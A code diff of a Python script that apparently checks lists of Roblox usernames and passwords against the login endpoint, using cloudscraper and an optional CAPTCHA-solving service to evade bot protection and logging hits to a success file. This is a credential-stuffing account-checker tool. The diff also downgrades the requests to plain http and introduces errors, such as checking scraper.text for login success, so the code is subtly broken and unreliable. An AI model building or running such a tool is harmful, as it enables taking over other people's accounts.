@@ -81,14 +81,14 @@ if use_capsolver:
         'provider': 'capsolver',
         'api_key': capsolver.api_key
     }
-scraper = cloudscraper.create_scraper(**scraper_args)
+scraper = cloudscraper.create_scraper()  # Create a cloudscraper instance
 # Make an HTTP request to the login page to get the initial cookies
 
 # session = scraper.session()
-# session.get("https://www.roblox.com/Login")
+# session.get("http://www.roblox.com/Login")
 
 getheaders = {
-    'referer': 'https://www.roblox.com/',
+    'referer': 'http://www.roblox.com/',
     'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
@@ -100,7 +100,7 @@ getheaders = {
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39'
 }
 
-response = scraper.get("https://www.roblox.com/login", headers=getheaders)
+response = cloudscraper.get("http://www.roblox.com/login", headers=getheaders)
 soup = BeautifulSoup(response.content, 'html.parser')
 xcsrf_token = soup.find('meta', attrs={'name': 'csrf-token'})['data-token']
 # Create the success and failure files if they do not exist
@@ -164,8 +164,8 @@ for line in lines:
 
     # Send the login request
     postheaders = {
-    'origin': 'https://www.roblox.com',
-    'referer': 'https://www.roblox.com/',
+    'origin': 'http://www.roblox.com',
+    'referer': 'http://www.roblox.com/',
     'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
@@ -175,7 +175,7 @@ for line in lines:
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39',
     'x-csrf-token': xcsrf_token
 }
-    response = scraper.post("https://www.roblox.com/authentication/login", data=data, headers=postheaders)
+    response = scraper.post("http://www.roblox.com/authentication/login", data=data, headers=postheaders)
 
     # Check if the login was successful
     if "Recommended For You" in scraper.text:
